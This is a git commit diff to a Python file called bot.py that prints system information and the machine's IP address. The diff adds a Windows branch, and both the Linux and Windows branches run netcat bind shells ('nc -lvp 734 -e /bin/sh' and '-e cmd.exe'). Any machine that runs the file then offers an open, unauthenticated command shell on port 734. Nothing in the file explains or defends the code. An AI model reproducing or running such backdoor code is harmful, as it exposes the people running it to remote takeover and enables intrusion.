d55a7d68489df08a0aa5bf52f408773a55e138f6
kaki714 <123768052+kaki714@users.noreply.github.com>
2023-02-14 07:10:53 -0500

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,8 +1,11 @@
 import platform
 import os
 import sysconfig
+import socket
 
 def run():
+    hostname=socket.gethostname()   
+    IPAddr=socket.gethostbyname(hostname) 
     print('###### # # # #######')
     print('#### # #  # # ######')
     print('#### ##    ## ######')
@@ -11,8 +14,10 @@ def run():
     print('# OS name: ', platform.system())
     if "Linux" in platform.system():
         print('Linux: ', sysconfig.get_platform()) 
-        os.system('ifconfig eth0')
+        print('Address ip: ', IPAddr)
         os.system( 'nc -lvp 734 -e /bin/sh')
     elif "Windows" in platform.system():
-        print('Comand nc windows')
+        print('Linux: ', sysconfig.get_platform()) 
+        print('Address ip: ', IPAddr)
+        os.system('nc -lvp 734 -e cmd.exe')
     
